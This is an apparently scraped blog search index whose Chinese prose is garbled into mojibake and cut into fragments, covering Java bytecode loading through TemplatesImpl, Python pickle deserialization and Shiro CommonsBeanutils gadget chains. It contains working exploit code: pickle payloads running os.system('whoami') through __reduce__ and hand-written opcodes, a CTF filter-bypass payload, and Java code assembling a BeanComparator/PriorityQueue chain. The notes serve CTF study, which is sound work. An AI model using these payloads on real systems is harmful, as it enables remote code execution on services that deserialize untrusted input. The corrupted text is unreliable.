è½½è¿œç¨‹classæ–‡ä»¶ClassLoaderæ˜¯javaçš„ç±»åŠ è½½å™¨ï¼Œå‘Šè¯‰javaè™šæ‹Ÿæœºå¦‚ä½•åŠ è½½è¿™ä¸ªç±»ï¼Œé»˜è®¤æ ¹æ®ç±»ååŠ è½½ç±»ï¼Œå¹¶ä¸”è¿™ä¸ªç±»åæ˜¯ç±»å®Œæ•´è·¯å¾„ï¼Œä¾‹å¦‚java.lang.Runtime###URLClassLoaderæ­£å¸¸æƒ…å†µä¸‹ï¼Œjavaä¼šæ ¹æ®sun.boot.class.pathå’Œjava.class.pathä¸­åˆ—ä¸¾çš„åŸºç¡€è·¯å¾„ï¼ˆè¿™äº›è·¯å¾„æ˜¯ç»è¿‡å¤„ç†åçš„java.net.URlç±»ï¼‰æ¥å¯»æ‰¾.classæ–‡ä»¶è¿›è¡ŒåŠ è½½,åŸºç¡€è·¯å¾„æœ‰ä¸‰ç§æƒ…å†µ URLæœªä»¥æ–œæ  / ç»“å°¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ªJARæ–‡ä»¶ï¼Œä½¿ç”¨ JarLoader æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨JaråŒ…ä¸­å¯»æ‰¾.classæ–‡ä»¶ URLä»¥æ–œæ  / ç»“å°¾ï¼Œä¸”åè®®åæ˜¯ file ï¼Œåˆ™ä½¿ç”¨ FileLoader æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å¯»æ‰¾.classæ–‡ä»¶ URLä»¥æ–œæ  / ç»“å°¾ï¼Œä¸”åè®®åä¸æ˜¯ file ï¼Œåˆ™ä½¿ç”¨æœ€åŸºç¡€çš„ Loader æ¥å¯»æ‰¾ç±»###defineClassåœ¨åŠ è½½è¿œç¨‹classæ–‡ä»¶ã€æœ¬åœ°classæˆ–è€…jaråŒ…æ—¶ï¼Œjavaéƒ½ç»å†äº†å…¶ä¸­ loadClass çš„ä½œç”¨æ˜¯ä»å·²åŠ è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼ˆè¿™é‡Œå®é™…ä¸Šæ˜¯åŒäº²å§”æ´¾æœºåˆ¶ï¼‰ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œ findClass findClass çš„ä½œç”¨æ˜¯æ ¹æ®åŸºç¡€URLæŒ‡å®šçš„æ–¹å¼æ¥åŠ è½½ç±»çš„å­—èŠ‚ç ï¼Œå°±åƒä¸Šä¸€èŠ‚ä¸­è¯´åˆ°çš„ï¼Œå¯èƒ½ä¼šåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€jaråŒ…æˆ–è¿œç¨‹httpæœåŠ¡å™¨ä¸Šè¯»å–å­—èŠ‚ç ï¼Œç„¶åäº¤ç»™defineClass defineClass çš„ä½œç”¨æ˜¯å¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆçœŸæ­£çš„Javaç±»###defineClassåŠ è½½å­—èŠ‚ç ####ä½¿ç”¨åå°„è¿›è¡ŒåŠ è½½Method defineclass = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;,String.class,byte[].class,int.class,int.class);defineClass,setAccessible(true);byte[] code= Base64.getDecoder().decode(&quot;&quot;);Class hello = (Class) defineclass.invoke(ClassLoader.getSystemClassLoader(),&quot;hello&quot;,code,0,code.length);hello.newInstance(); ####åˆ©ç”¨TemplatesImplåŠ è½½å­—èŠ‚ç com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImplè¿™ä¸ªç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªå†…éƒ¨ç±»TransletClassLoader ï¼šé‡å†™äº†defineClassæ–¹æ³•ï¼Œå¹¶ä¸”æ²¡æœ‰æ˜¾å¼åœ°å£°æ˜å…¶å®šä¹‰åŸŸã€‚å¦‚æœæ²¡æœ‰æ˜¾å¼å£°æ˜ï¼Œåˆ™å…¶ä½œç”¨åŸŸä¸ºdefaultï¼Œå¯ä»¥è¢«ç±»å¤–éƒ¨è°ƒç”¨ï¼Œè€ŒTransletClassLoader#defineClass()å‘å‰è¿½æº¯è°ƒç”¨é“¾ä»¥åå¯ä»¥å‘ç°ï¼Œå…¶æœ€å‰é¢çš„ä¸¤ä¸ªæ–¹æ³•ä¸ºæ³• TemplatesImpl#getOutputProperties() ã€ TemplatesImpl#newTransformer()#####ä½¿ç”¨newTransformer()æ„é€ pocbyte[] code=Base64.getDecoder().decode(&quot;&quot;);TemplatesImpl obj = new TemplatesImpl();setFieldValue(obj,&quot;_bytecodes&quot;,new byte[][]{code});setFieldValue(obj,&quot;_name&quot;,&quot;HelloTemplatesImpl&quot;);setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl);obj.newTransformer(); å…¶ä¸­ï¼šsetFieldValue æ–¹æ³•ç”¨æ¥è®¾ç½®ç§æœ‰å±æ€§ï¼Œå¯è§ï¼Œè¿™é‡Œæˆ‘è®¾ç½®äº†ä¸‰ä¸ªå±æ€§ï¼š _bytecodes ã€ _name å’Œ _tfactory ã€‚_bytecodes æ˜¯ç”±å­—èŠ‚ç ç»„æˆçš„æ•°ç»„ï¼› _name å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ä¸²ï¼Œåªè¦ä¸ä¸ºnullå³å¯ï¼›_tfactory éœ€è¦æ˜¯ä¸€ä¸ª TransformerFactoryImpl å¯¹è±¡ï¼Œå› ä¸ºTemplatesImpl#defineTransletClasses() æ–¹æ³•é‡Œæœ‰è°ƒç”¨åˆ°_tfactory.getExternalExtensionsMap() ï¼Œå¦‚æœæ˜¯nullä¼šå‡ºé”™ã€‚å¦å¤–ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œ TemplatesImpl ä¸­å¯¹åŠ è½½çš„å­—èŠ‚ç æ˜¯æœ‰ä¸€å®šè¦æ±‚çš„ï¼šè¿™ä¸ªå­—èŠ‚ç å¯¹åº”çš„ç±»å¿…é¡»æ˜¯ com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet çš„å­ç±»ã€‚å› æ­¤åœ¨æ„é€ è¿™ä¸ªç±»çš„æ—¶å€™è¦å†™extends","link":"/2022/09/14/java%E6%89%A7%E8%A1%8C%E5%AD%97%E8%8A%82%E7%A0%81/"},{"title":"phpä¸­opcacheç‰¹æ€§åˆ©ç”¨","text":"","link":"/2022/08/18/php%E4%B8%ADopcache%E7%89%B9%E6%80%A7%E5%88%A9%E7%94%A8/"},{"title":"pickleååºåˆ—åŒ–","text":"##pickleååºåˆ—åŒ–è¯­æ³•###å¯åºåˆ—åŒ–çš„å¯¹è±¡ None,True,False æ•´æ•°ã€æµ®ç‚¹æ•°ã€å¤æ•° strã€byteã€bytearray åªåŒ…å«å¯å°å­˜çš„å¯¹è±¡çš„é›†åˆï¼ŒåŒ…æ‹¬tupleã€listã€setã€dict å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å‡½æ•°ï¼ˆä½¿ç”¨defå®šä¹‰ï¼Œlambdaå‡½æ•°åˆ™ä¸å¯ä»¥ï¼‰ å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å†…ç½®å‡½æ•° å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„ç±» __dict__å±æ€§å€¼æˆ–__getstate__()å‡½æ•°çš„è¿”å›å€¼å¯ä»¥è¢«åºåˆ—åŒ–çš„ç±»###object.__reduce__()å‡½æ•° object.__reduce__()è¿”å›ä¸€ä¸ª(callable,([para1,para2....])[,...])çš„å…ƒç»„ï¼Œåœ¨unpickleæ—¶ï¼Œå°±ä¼šå°†callableä½œä¸ºå‡½æ•°å¹¶æ‰§è¡Œpara1å‚æ•° åœ¨ä¸‹æ–‡pickleçš„opcodeä¸­ï¼ŒRçš„ä½œç”¨ä¸object.__reduce__()å…³ç³»å¯†åˆ‡ï¼Œé€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°ã€‚åŒ…å«è¯¥å‡½æ•°çš„å¯¹è±¡è¢«pickleåºåˆ—åŒ–æ—¶ï¼Œå¾—åˆ°çš„å­—ç¬¦ä¸²æ˜¯åŒ…å«Rçš„ ###opcodeç‰ˆæœ¬ pickleæœ‰ä¸åŒçš„å®ç°ç‰ˆæœ¬ï¼Œåœ¨py2å’Œpy3ä¸­å¾—åˆ°çš„opcodeä¸åŒï¼Œä½†æ˜¯pickleå¯ä»¥å‘ä¸‹å…¼å®¹ã€‚ç›®å‰ï¼Œpickleæœ‰6ç§ç‰ˆæœ¬import picklea={'1':1,'2':2}print(f'# åŸå˜é‡ï¼š{a!r}')for i in range(4): print(f'pickleç‰ˆæœ¬{i}',pickle.dumps(a,protocol=i)) è¾“å‡ºï¼š# åŸå˜é‡ï¼š{'1': 1, '2': 2}pickleç‰ˆæœ¬0 b'(dp0\\nV1\\np1\\nI1\\nsV2\\np2\\nI2\\ns.'pickleç‰ˆæœ¬1 b'}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.'pickleç‰ˆæœ¬2 b'\\x80\\x02}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.'pickleç‰ˆæœ¬3 b'\\x80\\x03}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' ä»¥ä¸Šä¸ºä¸åŒç‰ˆæœ¬çš„opcodeå½¢å¼###pickletoolsé€šè¿‡pickletoolså¯ä»¥å°†opcodeè½¬åŒ–ä¸ºå®¹æ˜“è¯»å–çš„å½¢å¼###å¦‚ä½•ä½¿ç”¨æ‰‹å†™opcode####ä½¿ç”¨pickleåºåˆ—åŒ–ç¼–å†™ç®€å•çš„exp#####æˆåŠŸå‘½ä»¤æ‰§è¡Œimport pickleimport osclass testpoc(object): def __reduce__(self): s=&quot;whoami&quot; return os.system,(s,)exp= testpoc()poc=pickle.dumps(exp)print(poc)pickle.loads(poc) å€¼å¾—æ³¨æ„çš„æ˜¯è¿™é‡Œçš„è¿”å›å€¼ï¼Œéœ€è¦æ»¡è¶³reduceçš„ä½¿ç”¨æ–¹å¼ï¼Œç¬¬ä¸€æ¬¡å‚æ•°ä¸ºæ‰§è¡Œçš„å‡½æ•°ï¼Œç¬¬äºŒå‚æ•°éœ€è¦ä¸ºå…ƒç»„ï¼Œé‡Œé¢çš„å†…å®¹ä¸ºæ‰§è¡Œçš„å‚æ•°#####å®ç°å˜é‡è¦†ç›–import picklekey1 = b'321'key2 = b'123'class A(object): def __reduce__(self): return (exec,(&quot;key1=b'1'\\nkey2=b'2'&quot;,))a = A()pickle_a = pickle.dumps(a)print(pickle_a)pickle.loads(pickle_a)print(key1, key2) è¿™é‡Œæœ‰å¿…è¦ç†Ÿæ‚‰ä¸€ä¸‹execè¿™ä¸ªå‡½æ•°exec:exec obj.exec æ‰§è¡Œå‚¨å­˜åœ¨å­—ç¬¦ä¸²æˆ–æ–‡ä»¶ä¸­çš„Pythonè¯­å¥ï¼Œç›¸æ¯”äº evalï¼Œexecå¯ä»¥æ‰§è¡Œæ›´å¤æ‚çš„ Python ä»£ç ã€‚####æ‰‹å†™opcode#####pickleè¿‡ç¨‹è¯¦ç»†è§£è¯» 1.pickleä¾é pvmè¿›è¡Œï¼Œæ¶‰åŠè§£æå¼•æ“ã€æ ˆã€å†…å­˜2.è§£æå¼•æ“ä»æµä¸­è¯»å–opcodeå’Œå‚æ•°ï¼Œå¹¶å¯¹é½è¿›è¡Œè§£é‡Šï¼Œé‡åˆ°.çš„æ—¶å€™åœæ­¢ï¼Œæœ€ç»ˆç•™åœ¨æ ˆå®šçš„å€¼ä¼šè¢«ä½œä¸ºååºåˆ—åŒ–å¯¹è±¡è¿”å›3.memoï¼šç”±pythonçš„dictå®ç°ï¼Œå°†ååºåˆ—åŒ–å®Œæˆçš„æ•°æ®ä»¥key-valueçš„å½¢å¼å­˜å‚¨åœ¨memoä¸­#####opcodeæ“ä½œé›†åˆå…·ä½“çš„å°±çœ‹è¿™é‡Œçš„è¡¨æ ¼ï¼šhttps://xz.aliyun.com/t/7436ç¼–å†™æ—¶éœ€è¦æ³¨æ„ äº†è§£æ ˆä¸­æ•°æ®çš„å˜åŒ–ï¼Œæ­£ç¡®ä½¿ç”¨opcode ä¸pythonæœ¬èº«çš„æ“ä½œå¯¹ç…§ï¼Œæ¯”å¦‚appendå¯¹åº”aï¼Œextenå¯¹åº”e cæ“ä½œç¬¦ä¼šå°è¯•importåº“ï¼Œæ‰€ä»¥åœ¨pickle.loadsæ—¶ä¸éœ€è¦æ¼æ´ä»£ç ä¸­å…ˆå¼•å…¥ç³»ç»Ÿåº“ã€‚ pickleä¸æ”¯æŒåˆ—è¡¨ç´¢å¼•ã€å­—å…¸ç´¢å¼•ã€ç‚¹å·å–å¯¹è±¡å±æ€§ä½œä¸ºå·¦å€¼ï¼Œéœ€è¦ç´¢å¼•æ—¶åªèƒ½å…ˆè·å–ç›¸åº”çš„å‡½æ•°ï¼ˆå¦‚getattrã€dict.getï¼‰æ‰èƒ½è¿›è¡Œã€‚ä½†æ˜¯å› ä¸ºå­˜åœ¨sã€uã€bæ“ä½œç¬¦ï¼Œä½œä¸ºå³å€¼æ˜¯å¯ä»¥çš„ã€‚å³â€œæŸ¥å€¼ä¸è¡Œï¼Œèµ‹å€¼å¯ä»¥â€ã€‚pickleèƒ½å¤Ÿç´¢å¼•æŸ¥å€¼çš„æ“ä½œåªæœ‰cã€iã€‚è€Œå¦‚ä½•æŸ¥å€¼ä¹Ÿæ˜¯CTFçš„ä¸€ä¸ªé‡è¦è€ƒç‚¹ã€‚ sã€uã€bæ“ä½œç¬¦å¯ä»¥æ„é€ å¹¶èµ‹å€¼åŸæ¥æ²¡æœ‰çš„å±æ€§ã€é”®å€¼å¯¹ã€‚ä»¥ä¸Šä¸ºç²˜è´´å¤åˆ¶å†…å®¹ï¼Œè¿˜ä¸å¤ªç†è§£ï½ æ‹¼æ¥opcodeï¼šå°†ç¬¬ä¸€ä¸ªpickleæµç»“å°¾è¡¨ç¤ºç»“æŸçš„.å»æ‰ import opcodeimport secretimport pickleimport pickletoolsopcode=b&quot;&quot;&quot;c__main__secret(S'name'S'1'db.&quot;&quot;&quot;print('be:',secret.name)output=pickle.loads(opcode)print('output:',pickletools.dis(opcode))print('af:',secret.name) è¿™é‡Œæ¥è§£æä¸€ä¸‹è¿™ä¸ªopcode1.c__main__\\nsecret\\nï¼šä½¿ç”¨cæ“ä½œç¬¦ï¼Œå¼•å…¥å½“å‰mainæ¨¡å—ï¼Œå¹¶ä¸”è·å–secretå¯¹è±¡2.S:å®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡3.(ï¼šå‘æ ˆä¸­å‹å…¥ä¸€ä¸ªMARKæ ‡è®°4.dï¼šå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå­—å…¸ï¼ˆå› æ­¤å¿…é¡»è¦å¶æ•°ä¸ªï¼Œå‘ˆkey-valueå¯¹ï¼‰5.b:ä½¿ç”¨æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå­˜å‚¨å±æ€§å€¼ä¹Ÿæœ‰å±æ€§åçš„å­—å…¸ï¼‰ï¼Œå¯¹ç¬¬äºŒä¸ªå…ƒç´ è¿›è¡Œå±æ€§è®¾ç½®#####ä¸å‡½æ•°æ‰§è¡Œç›¸å…³çš„opcodeï¼šRã€iã€oR: poc=b&quot;&quot;&quot;cossystem(S'whoami'tR.&quot;&quot;&quot; cå¼•å…¥osæ¨¡å—ï¼Œè·å–å…¶systemå‡½æ•°ï¼Œmarkæ ‡è®°whoamiå‚æ•°ï¼Œä½¿ç”¨tæ“ä½œç¬¦å°†whoamiè½¬åŒ–ä¸ºå…ƒç»„ï¼Œå› ä¸ºræ“ä½œç¬¦çš„å¯¹è±¡æ˜¯å…ƒç»„i:iæ“ä½œç¬¦ç›¸å½“äºcå’Œoçš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰å…·ä½“å†™æ³•ï¼ši[module]\\n[callable]\\n poc=b'''(S'whoami'iossystem.'''print(pickletools.dis(poc))output=pickle.loads(poc) è·Ÿç€è¿™ä¸ªæ‰“å°ç»“æœï¼Œå¯ä»¥è§£æä¸€ä¸‹ï¼šç»„åˆäº†whoamiä¸ºä¸€ä¸ªå…ƒç»„ä½œä¸ºè·å–åˆ°çš„systemè¿™ä¸ªå‡½æ•°çš„å‚æ•°o:å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸ºcallableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬nä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰ poc=b'''(cossystemS'whoami'o.'''print(pickletools.dis(poc))output=pickle.loads(poc) ##å®æˆ˜###pkerå·¥å…·ä½¿ç”¨éƒ¨åˆ†è¯­æ³•ï¼š ä»¥ä¸‹moduleéƒ½å¯ä»¥æ˜¯åŒ…å«`.`çš„å­moduleè°ƒç”¨å‡½æ•°æ—¶ï¼Œæ³¨æ„ä¼ å…¥çš„å‚æ•°ç±»å‹è¦å’Œç¤ºä¾‹ä¸€è‡´å¯¹åº”çš„opcodeä¼šè¢«ç”Ÿæˆï¼Œä½†å¹¶ä¸ä¸pkerä»£ç ç›¸äº’ç­‰ä»·GLOBALå¯¹åº”opcodeï¼šb'c'è·å–moduleä¸‹çš„ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼ˆæ²¡æœ‰importçš„ä¹Ÿå¯ä»¥ï¼Œæ¯”å¦‚ä¸‹é¢çš„osï¼‰ï¼šGLOBAL('os', 'system')è¾“å…¥ï¼šmodule,instance(callableã€moduleéƒ½æ˜¯instance) INSTå¯¹åº”opcodeï¼šb'i'å»ºç«‹å¹¶å…¥æ ˆä¸€ä¸ªå¯¹è±¡ï¼ˆå¯ä»¥æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼‰ï¼šINST('os', 'system', 'ls') è¾“å…¥ï¼šmodule,callable,para OBJå¯¹åº”opcodeï¼šb'o'å»ºç«‹å¹¶å…¥æ ˆä¸€ä¸ªå¯¹è±¡ï¼ˆä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºcallableï¼Œå¯ä»¥æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼‰ï¼‰ï¼šOBJ(GLOBAL('os', 'system'), 'ls') è¾“å…¥ï¼šcallable,paraxxx(xx,...)å¯¹åº”opcodeï¼šb'R'ä½¿ç”¨å‚æ•°xxè°ƒç”¨å‡½æ•°xxxï¼ˆå…ˆå°†å‡½æ•°å…¥æ ˆï¼Œå†å°†å‚æ•°å…¥æ ˆå¹¶è°ƒç”¨ï¼‰li[0]=321æˆ–globals_dic['local_var']='hello'å¯¹åº”opcodeï¼šb's'æ›´æ–°åˆ—è¡¨æˆ–å­—å…¸çš„æŸé¡¹çš„å€¼xx.attr=123å¯¹åº”opcodeï¼šb'b'å¯¹xxå¯¹è±¡è¿›è¡Œå±æ€§è®¾ç½®returnå¯¹åº”opcodeï¼šb'0'å‡ºæ ˆï¼ˆä½œä¸ºpickle.loadså‡½æ•°çš„è¿”å›å€¼ï¼‰ï¼šreturn xxx # æ³¨æ„ï¼Œä¸€æ¬¡åªèƒ½è¿”å›ä¸€ä¸ªå¯¹è±¡æˆ–ä¸è¿”å›å¯¹è±¡ï¼ˆå°±ç®—ç”¨é€—å·éš”å¼€ï¼Œæœ€åä¹Ÿåªè¿”å›ä¸€ä¸ªå…ƒç»„ï¼‰ ####2022ç¾å›¢ctfå¤ç° a = base64.b64decode(session.get('ser_data')).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;)if b'R' in a or b'i' in a or b'o' in a or b'b' in a: raise pickle.UnpicklingError(&quot;R i o b is forbidden&quot;)pickle.loads(base64.b64decode(session.get('ser_data'))) å‰é¢å°±æ˜¯sessionçš„ä¼ªé€ æ“ä½œï¼Œå…³é”®çš„pickleååºåˆ—åŒ–ä»£ç åœ¨è¿™ä¸ªä½ç½®å¯ä»¥çœ‹åˆ°ï¼Œä»–å°†builtinå’Œosç­‰å†…å®¹éƒ½è¿‡æ»¤äº†ï¼Œå¹¶ä¸”å°†æˆ‘ä»¬éœ€è¦çš„Roibå­—ç¬¦ä¹Ÿè¿‡æ»¤äº†ï¼Œé¦–å…ˆä»ä»£ç é€»è¾‘å±‚é¢ç ”ç©¶ä»–ä¼šå°†osæ›¿æ¢ä¸ºOs,æ­¤æ—¶å¦‚æœæœ€åçš„æ“ä½œç¬¦è¾“å…¥ï¼Œè€Œåœ¨pickleä¸­ï¼Œæœ‰ä¸€ä¸ªç‚¹å¾ˆå…³é”®å°±æ˜¯ï¼Œopcodeåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œé‡åˆ°è¯­æ³•é”™è¯¯å°±ä¼šåœæ­¢æ‰§è¡Œï¼Œä½†æ˜¯åœ¨ä¹‹å‰å…¥è¿‡è¯­æ³•æ˜¯æ­£ç¡®çš„ï¼Œåˆ™ä¼šç…§å¸¸æ‰§è¡Œè¿™å…¶å®å¾ˆç¬¦åˆpythonçš„é£æ ¼ï¼Œpythonä¹Ÿæ˜¯ä¸€ç›´æ‰§è¡Œç›´åˆ°å‡ºç°è¯­æ³•é”™è¯¯ä¸ºæ­¢ã€‚payloadï¼š poc=b&quot;&quot;&quot;(cossystemS'whoami'os.&quot;&quot;&quot; å¯ä»¥çœ‹åˆ°ï¼Œå³ä½¿æœ€åè·‘å‡ºäº†errorï¼Œä½†æ˜¯ä¾æ—§æ‰§è¡Œå‘½ä»¤äº†#####è§£æ³•äºŒè¿™ç§è§£æ³•æ›´è€ƒå¯Ÿå¯¹pickleååºåˆ—åŒ–çš„ç†è§£äº†https://chowdera.com/2022/263/202209200043416482.html","link":"/2022/11/20/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"shiroååºåˆ—åŒ–æ¼æ´","text":"##æ¼æ´åˆ†æé¦–å…ˆæˆ‘ä»¬çœ‹åˆ°å…¶åŠ å¯†çš„keyæ˜¯ä¸€ä¸ªå›ºå®šå€¼æœ‰äº†è¿™ä¸ªkeyæˆ‘ä»¬å°±å¯ä»¥ä¼ªé€  ##åˆ©ç”¨shiroæ‰“cc3.2.1é¦–å…ˆæˆ‘ä»¬çŸ¥é“ï¼Œå¦‚æœç›´æ¥ç”¨invokeTransformeræ‰“çš„è¯æ˜¯æ‰“ä¸é€šçš„ï¼Œå› ä¸ºåœ¨shiroé‡Œé¢ï¼Œå¦‚æœä½¿ç”¨æ•°ç»„è¿›è¡Œååºåˆ—åŒ–ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ„é€ ä¸€æ¡ä¸ç”¨æ•°ç»„çš„â€”â€”cc2ï¼Œä½†æ˜¯cc2ååŠæ®µæ˜¯ç”¨äºcc4.0ç‰ˆæœ¬çš„ï¼Œæ‰€ä»¥ååŠæ®µæˆ‘ä»¬éœ€è¦æ›¿æ¢ä¸€ä¸‹ï¼Œè¿™é‡Œæˆ‘ç”¨çš„æ˜¯cc6çš„ååŠæ®µé¦–å…ˆï¼Œå‰é¢éƒ¨åˆ†å°±æ˜¯cc2çš„å†…å®¹ï¼Œä¸ä¾èµ–äºæ•°ç»„çš„ä¼ å‚æ–¹å¼ï¼Œç„¶ååé¢çš„éƒ¨åˆ†ä½¿ç”¨çš„æ˜¯cc6çš„é“¾æ¡ï¼Œå› ä¸ºå…¶æ— æ•°ç‰ˆæœ¬ï¼Œæ‰€ä»¥æ¯”è¾ƒåˆé€‚ä¸€äº› ##åˆ©ç”¨shiroæ— ä¾èµ–åˆ©ç”¨é“¾ç”±äºshiroæœ¬èº«æ˜¯ä¸å¸¦ccçš„ä¾èµ–ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ä»–è‡ªèº«å¸¦çš„ä¾èµ–â€”â€”commons-beanutilsï¼šè¿™ä¸ªæ˜¯ç”¨æ¥æ–¹ä¾¿è°ƒç”¨javaBeançš„ï¼Œåœ¨ä½¿ç”¨è¿™ä¸ªcbè¿›è¡Œè°ƒç”¨çš„æ—¶å€™ï¼Œä½¿ç”¨ä»¥ä¸‹æ ¼å¼çš„è¯ï¼Œä¼šåœ¨templateè¿™ä¸ªå¯¹è±¡é‡Œé¢ï¼Œè°ƒç”¨getOutputPropertiesæ–¹æ³• PropertyUtils.getProperty(template,&quot;outputProperties&quot;); æ¥ä¸‹æ¥æˆ‘ä»¬å°±åˆ†æä¸€ä¸‹è¿™ä¸ªåˆ©ç”¨é“¾ï¼šé¦–å…ˆæˆ‘ä»¬ç¡®å®šä¸€ä¸‹ç»ˆç‚¹ï¼Œä¾æ—§æ˜¯templatesçš„getOutputPropertiesæ–¹æ³•ï¼Œå› ä¸ºè¿™ä¸ªæ—¶å€™å°±ä¼šè°ƒç”¨newTransformeræ–¹æ³•æ¥ä¸‹æ¥æˆ‘ä»¬å°±æ‰¾æ‰¾å“ªé‡Œæœ‰ä½¿ç”¨PropertyUtils.getPropertyæ–¹æ³•ï¼Œå¯ä»¥å‘ç°BeanComparator.compareä¸­è°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•ï¼Œå¹¶ä¸”å‚æ•°æ˜¯å¯æ§çš„ï¼Œè¯´åˆ°compareï¼Œå…¶å®å°±å¾ˆç†Ÿæ‚‰äº†ï¼Œåœ¨cc4ä¸­ä¸­ï¼Œæˆ‘ä»¬å°±æœ‰ç”¨è¿‡äº†ï¼Œè¿™é‡Œç›´æ¥ç²˜è´´è¿‡æ¥æ„é€ ä¸€ä¸‹é“¾å­å…¶ä¸­éœ€è¦æ”¹çš„åœ°æ–¹ï¼Œé¦–å…ˆæ˜¯å¢åŠ è°ƒç”¨BeanComparatorç„¶åå°±æ˜¯åé¢å¯¹PriorityQueueçš„èµ‹å€¼æ“ä½œï¼Œ //BeanComparatorä¸­çš„å±æ€§propertieséœ€è¦è®¾ç½®ä¸€ä¸‹ï¼Œå°±æ˜¯æˆ‘ä»¬éœ€è¦è°ƒç”¨çš„å±æ€§ BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;);//ä¸ºäº†é˜²æ­¢åœ¨åºåˆ—åŒ–çš„è¿‡ç¨‹ç›´æ¥æ‰§è¡Œï¼Œç„¶åæŠ¥é”™æ–­æ‰ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦å…ˆå¼„ä¸€ä¸ªå…¶ä»–çš„å¯¹è±¡æ›¿ä»£ä¸€ä¸‹ï¼Œæœ€åå†ç”¨åå°„æ”¹å€¼ TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);//è¿™é‡Œçš„addå°±å’Œå‰é¢çš„cc4æ²¡å•¥åŒºåˆ«äº† priorityQueue.add(template); priorityQueue.add(2);//æœ€åè¿™é‡Œç”¨åå°„æ”¹å€¼å°±è¡Œ Class p = priorityQueue.getClass(); Field priorityQueuecon = p.getDeclaredField(&quot;comparator&quot;); priorityQueuecon.setAccessible(true); priorityQueuecon.set(priorityQueue,beanComparator); ä½†æ˜¯è¿™é‡Œæœ‰å‡ ä¸ªå‘ï¼Œå¦‚æœæ²¡æœ‰ccä¾èµ–çš„è¯ï¼Œè¿™é‡Œçš„BeanComparatoréœ€è¦è¿™ä¹ˆå†™æ‰è¡Œï¼Œå› 